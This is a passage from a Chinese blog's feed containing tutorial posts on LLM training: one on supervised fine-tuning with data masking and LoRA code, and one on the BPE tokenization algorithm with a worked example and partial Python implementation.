    <category term="PPO 算法" scheme="https://blog.fyz666.xyz/tags/ppo-%E7%AE%97%E6%B3%95/"/>
    
    <category term="强化学习" scheme="https://blog.fyz666.xyz/tags/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>大语言模型训练原理与实践（二）：监督微调(SFT)</title>
    <link href="https://blog.fyz666.xyz/blog/12690/"/>
    <id>https://blog.fyz666.xyz/blog/12690/</id>
    <published>2025-06-23T06:25:25.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<p>在前两篇文章中，博主已经简单介绍了大语言模型的<a href="/blog/12634/">预训练阶段</a>，以及如何通过<a href="/blog/12679/">BPE（Byte Pair Encoding）算法</a>将自然语言高效地转化为离散的子词单元，从而降低词表规模、提高模型泛化能力。</p><p>我们已经知道，在大规模语料数据上进行的预训练使模型具备了广泛的语言知识，但它学到的仅仅是“如何预测下一个词”的通用能力，距离解决特定任务（如问答、摘要、对话）还有相当的差距。</p><p>而<strong>监督微调</strong>正是让大语言模型从通用语言能力升级到任务导向能力的必经之路。换言之，SFT让模型不仅仅局限于能够把话写通顺，还能写的<strong>对题</strong>。</p><div class="note primary simple"><p>另外，博主基于一款参数量约为 2.13B 的迷你大语言模型，完成了其微调流程的简要复现。相关代码已开源，详见下面链接。</p><p>通过合理配置训练参数，并结合 LoRA（Low-Rank Adaptation），整个微调训练流程可在一块消费级显卡（博主使用的是 RTX 3090 Ti）上顺利完成。</p></div><a class="tag-Link" target="_blank" href="https://github.com/windshadow233/tiny-llm-training/">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">tiny-llm-training</div>            <div class="tag-link-sitename">GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><h2 id="监督微调是什么"><a href="#监督微调是什么" class="headerlink" title="监督微调是什么"></a>监督微调是什么</h2><p><strong>监督微调（Supervised Fine-Tuning, SFT）</strong>是指在预训练模型的基础上，利用一个特定任务的人类标注数据集对模型进行进一步训练，从而教会模型如何更好地执行具体指令或任务，例如问答、摘要、对话、翻译等。</p><p>与预训练阶段在海量无标注自然语言数据集上进行训练不同，SFT 使用成对的输入-输出样本，通过显式的任务目标，引导模型“怎么按人类意图作答”。这一阶段通常只微调模型的一部分参数，例如最后几层，既能保留预训练所得的通用语言知识，又能高效适应特定任务。</p><h2 id="数据集-amp-处理方法"><a href="#数据集-amp-处理方法" class="headerlink" title="数据集 &amp; 处理方法"></a>数据集 &amp; 处理方法</h2><p>这一阶段的训练数据可能长这样：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"prompt"</span><span class="token operator">:</span> <span class="token string">"请简要介绍一下蔡徐坤是谁。"</span><span class="token punctuation">,</span>    <span class="token property">"response"</span><span class="token operator">:</span> <span class="token string">"蔡徐坤是中国内地流行歌手、演员、音乐制作人，曾因参加《偶像练习生》节目而走红。"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不过，为了适合语言模型的输入格式，这类数据通常会被拼接成统一的 <strong>prompt 模板格式</strong>，明确区分“指令”和“回答”的结构，引导模型学会角色扮演和任务对齐。例如：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">Human: 请简要介绍一下蔡徐坤是谁。Assistant: 蔡徐坤是中国内地流行歌手、演员、音乐制作人，曾因参加《偶像练习生》节目而走红。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者这种格式：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">### Instruction:请简要介绍一下蔡徐坤是谁。### Response:蔡徐坤是中国内地流行歌手、演员、音乐制作人，曾因参加《偶像练习生》节目而走红。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在实际训练时，这些格式会被进一步编码成 token 序列，并通过 label masking 的方式只对回答部分计算损失，这是因为我们的目的是让模型学会如何输出回答部分。下面代码给了一个具体的例子：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">__getitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> self<span class="token punctuation">.</span>dataset<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>    instruction <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'instruction'</span><span class="token punctuation">]</span>    <span class="token builtin">input</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span>    output <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token builtin">input</span><span class="token punctuation">:</span>        prompt <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"指令:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>instruction<span class="token punctuation">&#125;</span></span><span class="token string">\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">input</span><span class="token punctuation">&#125;</span></span><span class="token string">\n输出:"</span></span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        prompt <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"指令:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>instruction<span class="token punctuation">&#125;</span></span><span class="token string">\n输出:"</span></span>    prompt_ids <span class="token operator">=</span> self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>prompt<span class="token punctuation">,</span> add_special_tokens<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    response_ids <span class="token operator">=</span> self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>output<span class="token punctuation">,</span> add_special_tokens<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    input_ids <span class="token operator">=</span> prompt_ids <span class="token operator">+</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>bos_token_id<span class="token punctuation">]</span> <span class="token operator">+</span> response_ids    labels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>prompt_ids<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> response_ids    input_ids <span class="token operator">=</span> input_ids<span class="token punctuation">[</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>max_length<span class="token punctuation">]</span>    labels <span class="token operator">=</span> labels<span class="token punctuation">[</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>max_length<span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_ids<span class="token punctuation">)</span> <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>max_length<span class="token punctuation">:</span>        input_ids <span class="token operator">+=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>eos_token_id<span class="token punctuation">]</span>        labels <span class="token operator">+=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>eos_token_id<span class="token punctuation">]</span>    pad_len <span class="token operator">=</span> self<span class="token punctuation">.</span>max_length <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_ids<span class="token punctuation">)</span>    <span class="token keyword">if</span> pad_len <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        input_ids <span class="token operator">+=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>tokenizer<span class="token punctuation">.</span>pad_token_id<span class="token punctuation">]</span> <span class="token operator">*</span> pad_len        labels <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">*</span> pad_len    attention_mask <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>max_length <span class="token operator">-</span> pad_len<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> pad_len    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token string">"input_ids"</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>input_ids<span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span><span class="token builtin">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"attention_mask"</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>attention_mask<span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span><span class="token builtin">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"labels"</span><span class="token punctuation">:</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>labels<span class="token punctuation">,</span> dtype<span class="token operator">=</span>torch<span class="token punctuation">.</span><span class="token builtin">long</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码的完整版见<a href="https://github.com/windshadow233/tiny-llm-training/blob/main/SFT/dataset.py">此文件</a>。该方法做了两件事：</p><ul><li>将数据处理为 <code>prompt_ids + bos_token_id + response_ids + eos_token_id</code>的形式，构成完整的输入序列。</li><li>使用<code>-100</code>为<code>labels</code>中的<code>prompt</code>部分以及<code>pad</code>部分打上掩码（因为这些内容模型不需要学习）。</li></ul><h2 id="LoRA"><a href="#LoRA" class="headerlink" title="LoRA"></a>LoRA</h2><p><strong>LoRA（Low-Rank Adaptation）</strong> 是一种轻量级参数微调方法，其核心思想是<strong>矩阵的低秩分解</strong>，具体而言，是在不改变原有大模型参数的基础上，以两个低秩矩阵的乘积的形式添加一个可学习的增量参数模块，从而达到高效微调的目的。</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/15e83f27-ab39-454f-ae39-391ad7589f49.png" style="zoom:50%;" /></p><p>在SFT中，LoRA是一种常见的微调手段，这是因为对大模型进行全量微调不仅参数量太大、显存开销高，而且容易干扰原预训练模型（过多学习指令数据集导致模型忘记原有的语言能力），相比之下，LoRA 只在模型中插入少量可训练参数，既降低了资源需求，又避免了灾难性遗忘，使得微调过程更稳定、灵活，适合小数据集和多任务扩展场景。</p><p>LoRA 在不修改原始权重矩阵 <script type="math/tex">W\in\mathbb{R}^{m \times n}</script> 的前提下，通过添加一个<strong>低秩矩阵近似项</strong> <script type="math/tex">\Delta W</script> 来引入可学习的增量：</p><script type="math/tex; mode=display">W_{\text{LoRA}} = W+\Delta W=W+\frac{1}{\alpha}(AB)^\top</script><p>其中 <script type="math/tex">A\in\mathbb{R}^{n \times r}</script> 和 <script type="math/tex">B\in\mathbb{R}^{r \times m}</script> 是两个秩为 <script type="math/tex">r</script> 的矩阵。在训练时，我们冻结原始权重矩阵 <script type="math/tex">W</script>，仅学习 <script type="math/tex">A</script> 和 <script type="math/tex">B</script>，从而极大的减少了可学习的参数量，同时还能保证原始模型的表达能力不受过多干扰。</p><p>一个简单的LoRA层实现：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">import</span> Module<span class="token keyword">class</span> <span class="token class-name">LoraLinear</span><span class="token punctuation">(</span>torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> linear<span class="token punctuation">,</span> r<span class="token operator">=</span><span class="token number">128</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>linear <span class="token operator">=</span> linear        self<span class="token punctuation">.</span>r <span class="token operator">=</span> r        self<span class="token punctuation">.</span>alpha <span class="token operator">=</span> alpha        self<span class="token punctuation">.</span>scale <span class="token operator">=</span> alpha <span class="token operator">/</span> r        self<span class="token punctuation">.</span>lora_A <span class="token operator">=</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Parameter<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span>linear<span class="token punctuation">.</span>in_features<span class="token punctuation">,</span> r<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0.1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>lora_B <span class="token operator">=</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>Parameter<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>r<span class="token punctuation">,</span> linear<span class="token punctuation">.</span>out_features<span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>linear<span class="token punctuation">.</span>weight<span class="token punctuation">.</span>requires_grad <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        y <span class="token operator">=</span> self<span class="token punctuation">.</span>linear<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        y <span class="token operator">+=</span> self<span class="token punctuation">.</span>scale <span class="token operator">*</span> <span class="token punctuation">(</span>x @ self<span class="token punctuation">.</span>lora_A @ self<span class="token punctuation">.</span>lora_B<span class="token punctuation">)</span>        <span class="token keyword">return</span> y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="训练过程"><a href="#训练过程" class="headerlink" title="训练过程"></a>训练过程</h2><p>在完成数据预处理和模型结构准备（如插入 LoRA 模块）后，监督微调的训练流程与预训练阶段非常类似，核心仍是语言模型的自回归目标：</p><script type="math/tex; mode=display">\min_\theta\mathbb E(x,y)\sim\mathcal{D}[-\log P_\theta(y\mid x)]</script><p>其中 <script type="math/tex">x</script> 和 <script type="math/tex">y</script> 分别为用户的prompt和人类标注的参考回答。</p><p>训练流程的详细代码见<a href="https://github.com/windshadow233/tiny-llm-training/blob/main/sft_training.py">此文件</a>。</p><hr><p>到了这里，我们已经了解了大语言模型训练中的第二块拼图 —— <strong>监督微调（SFT）</strong>。它的核心目标，其实就是让模型“听话”：不仅能说得通顺，还要能说得符合人类的预期。</p><p>接下来，我们还希望模型变得更聪明——通过人类反馈优化（比如 RLHF），进一步学会给出更加符合人类偏好的回应。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;在前两篇文章中，博主已经简单介绍了大语言模型的&lt;a href=&quot;/blog/12634/&quot;&gt;预训练阶段&lt;/a&gt;，以及如何通过&lt;a href=&quot;/blog/12679/&quot;&gt;BPE（Byte Pair</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="大语言模型训练" scheme="https://blog.fyz666.xyz/categories/%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    
    
    <category term="机器学习" scheme="https://blog.fyz666.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://blog.fyz666.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
    <category term="SFT" scheme="https://blog.fyz666.xyz/tags/sft/"/>
    
  </entry>
  
  <entry>
    <title>大语言模型训练原理与实践（一）： BPE分词算法</title>
    <link href="https://blog.fyz666.xyz/blog/12679/"/>
    <id>https://blog.fyz666.xyz/blog/12679/</id>
    <published>2025-06-22T04:11:13.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<p><a href="/blog/12634/">上一篇文章</a>中，我们已经了解了大语言模型通过在海量自然语言语料上学习<strong>预测下一个 token</strong>，以此建立语言理解能力，这一过程也就是所谓的<strong>预训练</strong>。那么问题随之而来：我们经常提到的<strong>token</strong>究竟是什么？它与文本、词汇之间有着怎样的关系与区别？</p><p>为了解决这个问题，我们需要从文本如何被编码成模型可读的序列说起。</p><h2 id="早期的编码方案"><a href="#早期的编码方案" class="headerlink" title="早期的编码方案"></a>早期的编码方案</h2><h3 id="字符级编码"><a href="#字符级编码" class="headerlink" title="字符级编码"></a>字符级编码</h3><p>以英文为例，在早期的文本编码方案中，每个字符都被单独视为一个token，这也被称为字符级编码。例如，对于句子：”hello world!”，它的token序列（尚未映射为数字）为：<code>[&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;, &#39; &#39;, &#39;w&#39;, &#39;o&#39;, &#39;r&#39;, &#39;l&#39;, &#39;d&#39;, &#39;!&#39;]</code>。</p><p>这种编码方式的优点十分明显：实现简单、通用性（可扩展性）强，词表较小，可以处理几乎所有语言中的所有字符，不会存在OOV（Out-Of- Vocabulary）问题。然而，它也存在显著的局限性：</p><ul><li>由于每个字符都被单独编码，序列长度显著增加，模型在处理长文本时计算开销大，训练效率低。</li><li>字符粒度太细，模型难以捕捉词语层面的语义结构——试问有谁是按字符理解语言的？</li></ul><p><img src="https://blogfiles.oss.fyz666.xyz/webp/e1c46a25-73bb-466e-a26b-6c6f6fd79c1c.webp" alt=""></p><hr><h3 id="词级编码"><a href="#词级编码" class="headerlink" title="词级编码"></a>词级编码</h3><p>相比字符级编码，词级编码以「词（word）」作为基本单位，将每个词直接映射为一个 token。这是人类语言理解的自然粒度，因此这种编码方案在早期 NLP 模型中（如 Word2Vec、LSTM）被广泛采用。</p><p>同样对于句子：”hello world!”，采用词级编码得到的token序列为: <code>[&#39;hello&#39;, &#39;world&#39;, &#39;!&#39;]</code>。</p><p>这种编码方式的优点在于：</p><ul><li>直观，与人类语言习惯一致，每个token具有完整的语义信息。</li><li>编码序列短，处理效率高。</li></ul><p>但这种编码方式也存在缺点：</p><ul><li><p>每个词都得编码成一个token，导致词表庞大。</p><blockquote><p>Many people estimate that there are more than a million words in the English language. In fact, during a project looking at words in digitised books, researchers from Harvard University and Google in 2010, they estimated a total of 1,022,000 words and that the number would grow by several thousand each year.</p><p><cite><a href="https://englishlive.ef.com/en/blog/language-lab/many-words-english-language/">English Live</a></cite></p></blockquote></li><li><p>词表虽然变大了，但出现未登录词的可能性反而上升了：一旦有什么新的单词没收录在表里，模型只能以<code>&lt;unk&gt;</code>代替，导致信息损失严重。</p></li><li><p>跨语言迁移能力较差。</p></li></ul><hr><p>我们可以看到，前述的两种分词编码方法要么粒度太细，模型读不懂语义；要么粒度太粗，新词一来就懵逼，只能用 <code>&lt;unk&gt;</code> 顶上。可见这两种方式都不太理想。</p><p>为了取得两者的平衡，让模型在表达能力与编码效率之间取得更好的平衡，子词级编码方法被提出。这类方法试图将文本划分为比「词」更小、但比「字符」更有语义的信息单元，从而兼顾词汇覆盖率与建模能力。其中最具代表性、也是目前应用最广泛的方案，就是<strong>BPE（Byte Pair Encoding）算法</strong>。</p><h2 id="BPE-算法"><a href="#BPE-算法" class="headerlink" title="BPE 算法"></a>BPE 算法</h2><p>如前文提到的，在自然语言处理中，研究者经常会面临两个极端：</p><ul><li><p>下策：以字符为编码单位，不容易OOV，但缺点过于致命：模型完全不知道这些字符合起来是什么意思，学习难度过大。</p></li><li><p>上策：以词为编码编码单位，可以保留完整的语义信息，例如：<code>internationalization</code>这个词整体作为一个token，语义信息丰富，看上去省事省心一步到位。然而，问题来了——如果是<code>internationalizations</code>呢？多了个 s，抱歉，模型词典里没有，不认识。由此可见，词级编码面临一个大bug：<strong>词表巨大、组合爆炸、扩展性差</strong>。你得穷尽所有单词的各种变形、拼写版本……搞得像字典编辑部天天加班。</p></li></ul><p><img src="https://blogfiles.oss.fyz666.xyz/webp/de3e2fce-1145-44df-b34e-fb275c4cb410.webp" style="zoom:50%;" /></p><p>于是，一种「花下策的成本，达到上策的效果」的中策应运而生：BPE算法。（当然，实际上成本肯定是要高于下策的，但性价比已经相当高了）</p><p>其实这个算法<a href="http://www.pennelynn.com/Documents/CUJ/HTML/94HTML/19940045.HTM">很早就已经被提出了</a>，当时是用于数据压缩，其基本思路是通过寻找文本中出现频率最高的相邻字节对，将其合并为一个新的字节，然后重复该操作直到达成某种终止条件。</p><p>本文略过该算法在数据压缩领域的应用，直接介绍如何将这种思路用于tokenizer。</p><hr><h3 id="算法流程概览"><a href="#算法流程概览" class="headerlink" title="算法流程概览"></a>算法流程概览</h3><p>偷懒了，这里直接放个训练过程的伪代码。</p><script type="math/tex; mode=display">\begin{array}{l}\nonumber\textbf{输入：}~\mathcal{C}~\text{（训练语料），目标词表大小}~V \\[1ex]\textbf{初始化：} \\\quad \mathcal{T} \leftarrow \text{将每个词拆为字符序列，并在末尾加上}~\texttt{</w>} \\\quad \text{词表}~\mathcal{V} \leftarrow \text{所有出现的字符}~\cup~\{\texttt{</w>}\} \\\quad \text{合并规则序列}~\mathcal{M}\leftarrow \text{空集} \\[1ex]\textbf{重复，直到}~|\mathcal{V}| \geq V~\text{或无高频对：} \\\quad 1.~\text{统计}~\mathcal{T}~\text{中所有相邻 token 对的频率:}~f(a, b) \\\quad 2.~\text{选出频率最高的对}~(a^*, b^*) = \arg\max f(a, b) \\\quad 3.~\text{将合并规则:}~(a^*, b^*)\rightarrow a^*b^*~\text{加入}~\mathcal{M}\\\quad 4.~\text{将}~\mathcal{T}~{中所有}~(a^*, b^*)~\text{合并为新 token:}~a^*b^* \\\quad 5.~\text{将}~a^*b^*~加入词表~\mathcal{V} \\\quad 6.~\textbf{若}~a^*~\text{或}~b^*~\text{已不再以独立 token 出现在}~\mathcal{T}~\text{中,}~\textbf{则} \\\quad\quad\quad \text{从词表}~\mathcal{V}~\text{中移除}~a^*~\text{或}~b^* \\[1ex]\textbf{输出：}~\text{合并规则序列}~\mathcal{M}\end{array}</script><p>至于训练结束后如何进行分词，主要就是用了上面算法输出的合并规则序列 <script type="math/tex">\mathcal{M}</script>​​，分词过程的基本思路是：</p><div class="note primary simple"><p>先将输入文本按照最细粒度（如字符级）进行切分，然后依照 $\mathcal{M}$ 中的合并顺序，从上到下依次遍历并执行匹配合并操作，直到无法再匹配为止。</p></div><h3 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h3><p>以一个简单的语料集为例，假设我们拿到了数据：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">low lower lowestplay played playing playerhappy happier happiestrunning runs runnerinternational internationalization internationalizeunderstanding misunderstand misunderstanding<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们首先拿到所有单词按字符的拆分，同时在末尾添加一个符号<code>&lt;/w&gt;</code>表示词尾：</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/f6afae5c-b578-49a1-bf9c-caf476539aea.webp" alt="bpe" style="zoom:50%;" /></p><p>将所有出现过的字符记录下来，作为当前的词表（词表大小为19）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'&lt;/w>'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>假设我们的目标词表长度为25。</p><p>我们统计每一对<strong>相邻字符</strong>出现的频率，并按频率从高到低排序，我们得到<strong>相邻字符对</strong>的频率表（省略了后面的部分）：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">(&#39;e&#39;, &#39;r&#39;): 10(&#39;i&#39;, &#39;n&#39;): 7(&#39;u&#39;, &#39;n&#39;): 6(&#39;n&#39;, &#39;a&#39;): 6(&#39;n&#39;, &#39;d&#39;): 6(&#39;s&#39;, &#39;t&#39;): 5(&#39;r&#39;, &#39;&lt;&#x2F;w&gt;&#39;): 4...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到出现频率最高的组合：<code>(&#39;e&#39;, &#39;r&#39;)</code>，然后遍历所有拆分列表，将所有该组合进行合并，得到新的单词拆分方式：</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/c9e8a75d-986d-4ec3-9877-df2937a2e4a8.webp" alt="bpe" style="zoom:50%;" /></p><p>将组合<code>er</code>添加到词表中，不过此时单词的拆分中仍存在独立的<code>e</code>和<code>r</code>，故将它们保留在词表中。当前词表大小：20。</p><p>继续统计每一对相邻字符（此时，由于我们前面合并了<code>e</code>和<code>r</code>，故在统计时需要把<code>er</code>看作一个整体）。我们得到新的<strong>相邻字符对</strong>的频率表：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">(&#39;i&#39;, &#39;n&#39;): 7(&#39;u&#39;, &#39;n&#39;): 6(&#39;n&#39;, &#39;a&#39;): 6(&#39;n&#39;, &#39;d&#39;): 6(&#39;s&#39;, &#39;t&#39;): 5(&#39;er&#39;, &#39;&lt;&#x2F;w&gt;&#39;): 4...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>合并<code>i</code>与<code>n</code>，将<code>in</code>加入词表，不移除<code>i</code>和<code>n</code>。当前词表大小：21。</p><p>统计新的相邻字符频率：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">(&#39;u&#39;, &#39;n&#39;): 6(&#39;n&#39;, &#39;a&#39;): 6(&#39;n&#39;, &#39;d&#39;): 6(&#39;s&#39;, &#39;t&#39;): 5(&#39;er&#39;, &#39;&lt;&#x2F;w&gt;&#39;): 4...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>合并<code>u</code>与<code>n</code>，将<code>un</code>加入词表：</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/3a8df37e-695e-47e0-891a-46616dcbf22d.webp" alt="bpe" style="zoom:50%;" /></p><p>此时，发现已经没有单独出现的字符<code>u</code>了，因此从词表中移除<code>u</code>。当前词表大小：21。</p><hr><p>持续进行上述操作，直到达到下面两个终止条件之一：</p><ol><li>词表大小达到我们的预设值：本例中为25。</li><li>没有可合并的<strong>高频</strong>相邻字符对。（可自定义频率阈值）</li></ol><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> defaultdictcorpus <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'low lower lowest'</span><span class="token punctuation">,</span>    <span class="token string">'play played playing player'</span><span class="token punctuation">,</span>    <span class="token string">'happy happier happiest'</span><span class="token punctuation">,</span>    <span class="token string">'running runs runner'</span><span class="token punctuation">,</span>    <span class="token string">'international internationalization internationalize'</span><span class="token punctuation">,</span>    <span class="token string">'understanding misunderstand misunderstanding'</span><span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">BPE</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> corpus<span class="token punctuation">,</span> vocab_size<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>corpus <span class="token operator">=</span> corpus        self<span class="token punctuation">.</span>vocab_size <span class="token operator">=</span> vocab_size        self<span class="token punctuation">.</span>alphabet <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'&lt;/w>'</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>word_freqs <span class="token operator">=</span> 